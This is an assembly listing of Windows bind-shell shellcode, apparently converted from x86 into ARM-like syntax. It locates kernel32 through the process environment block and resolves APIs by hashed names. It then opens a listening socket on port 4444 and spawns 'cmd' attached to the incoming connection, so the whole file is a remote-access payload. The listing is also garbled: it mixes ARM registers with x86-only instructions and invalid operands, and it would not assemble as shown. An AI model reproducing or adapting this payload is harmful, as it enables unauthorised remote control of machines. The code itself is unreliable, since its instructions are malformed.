section .text
global _start

_start:
    ; Jump to the startup bounce point
    jmp startup_bnc

find_kernel32:
    ; Preserve registers
    push {r4-r11, lr}
    mov r0, #0
    ldr r0, [r0, #0x30]
    cmp r0, #0
    blt find_kernel32_9x
find_kernel32_nt:
    ldr r0, [r0, #0x0c]
    ldr r1, [r0, #0x1c]
    ldr r0, [r1]
    ldr r0, [r0, #0x8]
    b find_kernel32_finished
find_kernel32_9x:
    ldr r0, [r0, #0x34]
    add r0, r0, #0x7c
    ldr r0, [r0, #0x3c]
find_kernel32_finished:
    pop {r4-r11, lr}
    bx lr

find_function:
    ; Preserve all registers
    push {r0-r12, lr}
    mov r4, r0
    ldr r0, [r4, #0x3c]
    ldr r1, [r4, r0, lsl #2]
    add r1, r1, r4
    ldr r2, [r1, #0x18]
    ldr r3, [r1, #0x20]
    add r3, r3, r4
find_function_loop:
    subs r2, r2, #1
    bmi find_function_finished
    ldr r1, [r3, r2, lsl #2]
    add r1, r1, r4
    mov r5, #0
    mov r6, #0
compute_hash:
    ldrb r7, [r1], #1
    cmp r7, #0
    beq compute_hash_finished
    ror r5, r5, #13
    add r5, r5, r7
    b compute_hash
compute_hash_finished:
    ldr r7, [sp, #0x28]
    cmp r5, r7
    bne find_function_loop
    ldr r3, [r1, #0x24]
    add r3, r3, r4
    ldrh r2, [r3, r2, lsl #1]
    ldr r3, [r1, #0x1c]
    add r3, r3, r4
    ldr r0, [r3, r2, lsl #2]
    add r0, r0, r4
    str r0, [sp, #0x1c]
find_function_finished:
    pop {r0-r12, lr}
    bx lr

startup_bnc:
    jmp startup

resolve_symbols_for_dll:
    ldr r0, [r1], #4
    push {r0, r2}
    bl find_function
    str r0, [r3], #4
    add sp, #8
    cmp r1, r2
    bne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    bx lr

kernel32_symbol_hashes:
    .word 0xec0e4e8e
    .word 0x16b3fe72
    .word 0x73e2d87e

ws2_32_symbol_hashes:
    .word 0xadf509d9
    .word 0xc7701aa4
    .word 0xe92eada4
    .word 0x498649e5

startup:
    sub sp, sp, #0x60
    mov r4, sp
    jmp get_absolute_address_forward
get_absolute_address_middle:
    jmp get_absolute_address_end
get_absolute_address_forward:
    bl get_absolute_address_middle
get_absolute_address_end:
    pop {r1}
    bl find_kernel32
    mov r2, r0
resolve_kernel32_symbols:
    sub r1, r1, #0x2a
    lea r3, [r4, #4]
    mov r2, r1
    add r2, r2, #0x18
    bl resolve_symbols_for_dll
resolve_winsock_symbols:
    add r2, r2, #0x20
    mov r0, #0x74656e01
    asr r0, r0, #8
    push {r0}
    push {0x696e6977}
    mov r3, sp
    push {r2, r3}
    bl [r4, #4]
    pop {r2, r3}
    mov r2, r0
    bl resolve_symbols_for_dll
initialize_cmd:
    mov r0, #0x646d6301
    asr r0, r0, #8
    push {r0}
    mov [r4, #0x40], sp
create_socket:
    mov r0, #0
    push {r0, r0, r0, r0}
    mov r0, #1
    push {r0}
    mov r0, #2
    push {r0}
    bl [r4, #0x40]
    mov r1, r0
bind:
    mov r0, #0
    mov r1, #0
    push {r0, r0, r0}
    mov r0, #0x5c110102
    dec r0, #1
    push {r0}
    mov r0, sp
    mov r1, #0x10
    push {r1, r0, r1}
    bl [r4, #0x48]
listen:
    push {r1, r1}
    bl [r4, #0x50]
accept:
    push {r1}
    mov r2, sp
    sub sp, r1
    mov r3, sp
    push {r2, r3, r1}
    bl [r4, #0x58]
    mov r1, r0
initialize_process:
    mov r2, #0
    mov r2, #0x54
    sub sp, r2
    mov r3, sp
    push {r3}
zero_structs:
    mov r0, #0
    bl memset
initialize_structs:
    mov r3, sp
    mov r0, #0x44
execute_process:
    add r1, r3, #0x44
    push {r1, r3, r0, r0, r0, r0, r0, r0, [r4, #0x40], r0}
    bl [r4, #0x30]
exit_process:
    bl [r4, #0x38]